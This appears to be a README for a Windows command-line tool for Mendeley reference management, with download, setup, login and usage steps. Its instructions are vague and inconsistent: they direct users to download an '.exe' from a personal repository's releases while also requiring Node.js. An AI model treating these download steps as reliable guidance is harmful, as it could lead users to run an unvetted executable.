# 📚 mendeley-cli - Manage academic references with simple tools

[![](https://img.shields.io/badge/Download-mendeley--cli-blue.svg)](https://github.com/alejandrade5748/mendeley-cli)

This tool helps you interact with your Mendeley library. It supports automation tasks for your citations, BibTeX files, and research organization. You can use it as a command-line program or integrate it into your own scripts. Researchers use this to streamline their workflow and keep their reference data synced with AI systems.

## 📥 How to download the software

To start, you need to visit the project page. This location houses the latest version of the toolkit for Windows.

1. Open your web browser.
2. Navigate to [this page to download the software](https://github.com/alejandrade5748/mendeley-cli).
3. Look for the "Releases" section on the right side of the screen.
4. Click the link that matches the latest version number.
5. Select the file ending in `.exe` to save it to your computer.

## ⚙️ Setting up your system

This application requires Node.js to run correctly on your Windows machine. If you do not have this installed, follow these steps to prepare your environment.

1. Navigate to the official Node.js website.
2. Download the version labeled "LTS" or "Long Term Support."
3. Run the downloaded installer.
4. Follow the prompts in the installer window.
5. Keep the default options selected during the installation process.
6. Restart your computer after the installer finishes. This step ensures that your system recognizes the new tools.

## 🔑 Linking your Mendeley account

The tool needs permission to access your library. It uses a secure authentication process to verify your identity.

1. Open your command terminal. You can find this by typing "cmd" into your Windows search bar and pressing Enter.
2. Type the command provided in your documentation to initiate the login process.
3. Your browser will open a page from Mendeley.
4. Enter your Mendeley email and password.
5. Grant access when requested by the site.
6. The browser will redirect you. You can then close the browser window and return to your terminal.

## 🚀 Using the command line

Once you set up the account, you can perform tasks with simple commands. Open your command terminal and use these formats.

### Listing your references
The most common task involves viewing your library. Type the following command to retrieve a list:
mendeley-cli list

This command fetches the current entries from your account. The tool outputs a clear list in your terminal window.

### Exporting to BibTeX
Many researchers use this tool to export data for LaTeX or other writing software. Use this command to create a file:
mendeley-cli export --format bibtex

The tool saves a file named `references.bib` in your current folder. You can use this file immediately in your academic writing tools.

### Searching your library
You can search through your items by typing keywords. For example, to find references about machine learning, type:
mendeley-cli search "machine learning"

The tool returns all matching entries found in your Mendeley database.

## 🛠 Features of the tool

This application offers several advantages for organizing your research.

* **Automated Sync**: Keep your local BibTeX files updated with your Mendeley library without manual effort.
* **AI Integration**: The output format works with AI agents that require structured research data.
* **Batch Processing**: Handle large lists of citations in seconds.
* **Secure Access**: Use of standard authentication protocols keeps your password safe.
* **Versatility**: Use it as a solo tool or combine it with other scripts to build custom research workflows.

## 📋 System requirements

Before you run the software, check that your computer meets these requirements:

* **Operating System**: Windows 10 or Windows 11.
* **Memory**: Minimum 4GB of RAM.
* **Storage**: 50MB of space for the application and related data.
* **Network**: A stable internet connection to communicate with the Mendeley servers.

## ❓ Troubleshooting common issues

If you encounter problems, check these common fixes before reaching out for help.

### Command not found
If Windows reports that "mendeley-cli" is not a valid command, restart your terminal. If the issue persists, ensure that you added the installation folder to your system path during the setup of Node.js.

### Authentication failure
Double-check that you entered the correct login credentials on the website. If the browser login page fails to load, check your internet connection and try again using a different browser.

### Data not appearing
If your list appears empty, verify that you have existing references inside your Mendeley account. You can log into the Mendeley website to confirm your library contains data.

## 📦 Keeping the software current

Developers update this tool frequently to support changes to the Mendeley API. Check the repository periodically for new releases. To update your current version, visit the [link to download the software](https://github.com/alejandrade5748/mendeley-cli) again and replace the old file with the new one. Existing configuration files will remain intact, and you will not need to authenticate your account a second time.

## 📝 About this project

This toolkit targets users who want a simple way to manage citations programmatically. It removes the need for complex database management. Instead, you get direct access to your research items. Use this to maintain your bibliography for papers, projects, or thesis work. By bridging the gap between your library and your computer scripts, this tool saves time and reduces manual errors in your citations.